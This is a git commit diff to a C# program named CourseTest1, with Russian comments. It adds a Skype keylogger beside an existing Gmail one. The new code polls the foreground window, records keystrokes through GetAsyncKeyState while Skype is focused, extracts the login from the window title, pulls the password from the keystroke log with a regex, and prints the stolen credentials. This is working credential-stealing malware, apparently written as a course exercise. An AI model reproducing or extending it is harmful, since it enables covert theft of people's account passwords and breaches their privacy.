bbcef4208c7bfd90c6957675dfe1e4a4d87bd3d1
Valera Yalovchuk <valera.yalow4uk@gmail.com>
2016-10-26 20:43:27 +0300

    Signed-off-by: Valera Yalovchuk <valera.yalow4uk@gmail.com>

--- CourseTest1/Program.cs
+++ CourseTest1/Program.cs
@@ -20,24 +20,31 @@ namespace CourseTest1
         static void Main(string[] args)
         {
             GmailLogger gmaillogger = new GmailLogger();
-            Logger logger = new Logger(gmaillogger);
-            string logs = logger.Log();
-
+            Logger glogger = new Logger(gmaillogger);
+            string glogs = glogger.Log();
             GmailFind gfind = new GmailFind();
-            gfind.Find(logs);
-            string login = gfind.login, password = gfind.password;
-            Console.WriteLine(login + " " + password);
+            gfind.Find(glogs);
+            string glogin = gfind.login, gpassword = gfind.password;
+            Console.WriteLine("Skype" + glogin + " " + gpassword);
+
+            SkypeLogger skypelogger = new SkypeLogger();
+            Logger slogger = new Logger(skypelogger);
+            string slogs = slogger.Log();
+            SkypeFind sfind = new SkypeFind();
+            sfind.Find(slogs);
+            string slogin = sfind.login, spassword = sfind.password;
+            Console.WriteLine("Skype" + slogin + " " + spassword);
 
             Console.ReadKey();
         }
 
-        interface ILogger
+        interface ILogger//интерфейс логгирования
         {
             string appname { get; set; }
             string Log();
         }
 
-        class GmailLogger : ILogger
+        class GmailLogger : ILogger//логгирует нажатия со страницы gmail
         {
             public string appname { get; set; }
             public IUpgrade upgrader;
@@ -76,7 +83,46 @@ namespace CourseTest1
             }
         }
 
-        class Logger
+        class SkypeLogger : ILogger//логгирует нажатия с приложения skype
+        {
+            public string appname { get; set; }
+            public IUpgrade upgrader;
+            public SkypeLogger()
+            {
+                appname = "Skype";
+                upgrader = new KeyUpgrader();
+            }
+            public string Log()
+            {
+                int size = 100000;
+                StringBuilder logs = new StringBuilder(size), buff = new StringBuilder(size);
+                while (true)
+                {
+                    if (GetWindowText(GetForegroundWindow(), buff, size) > 0)
+                    {
+                        string s = buff.ToString();
+                        if (s.Contains(appname) && s.Contains(" - "))
+                        {
+                            logs.Append(s);
+                            return logs.ToString();
+                        }
+                        if (s == appname)
+                        {
+                            for (int i = 0; i < 255; i++)
+                            {
+                                int state = GetAsyncKeyState(i);
+                                if (state == 1 || state == -32767)
+                                {
+                                    logs.Append(upgrader.Upgrade(((Keys)i).ToString()));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        }
+
+        class Logger//логгирует символы нажатий клавиатуры
         {
             public ILogger logger;
             public Logger(ILogger logger)
@@ -89,14 +135,14 @@ namespace CourseTest1
             }
         }
 
-        interface IFind
+        interface IFind//интерфейс поиска в логах почты и пороля
         {
             string login { get; set; }
             string password { get; set; }
             void Find(string logs);
         }
 
-        class GmailFind : IFind//нахождение в логах почты и пороля
+        class GmailFind : IFind//поиск в логах почты и пороля gmail
         {
             public string login { get; set; }
             public string password { get; set; }
@@ -117,7 +163,28 @@ namespace CourseTest1
             }
         }
 
-        interface IUpgrade
+        class SkypeFind : IFind//поиск в логах почты и пороля skype
+        {
+            public string login { get; set; }
+            public string password { get; set; }
+            public void Find(string logs)
+            {
+                int start = logs.IndexOf(" - ") + 3, end = logs.Length;
+                login = logs.Substring(start, end - start);
+
+                string pattern = "mark[A-Za-z0-9]{8,200}mark";
+                Regex repas = new Regex(pattern, RegexOptions.Compiled);
+                foreach (Match match in repas.Matches(logs))
+                {
+                    StringBuilder temp = new StringBuilder(match.Value);
+                    temp.Replace("mark", "");
+                    if (temp.Length > 7)
+                        password = temp.ToString();
+                }
+            }
+        }
+
+        interface IUpgrade//интерфейс форматирования символов клавиатуры
         {
             string Upgrade(string sym);
         }
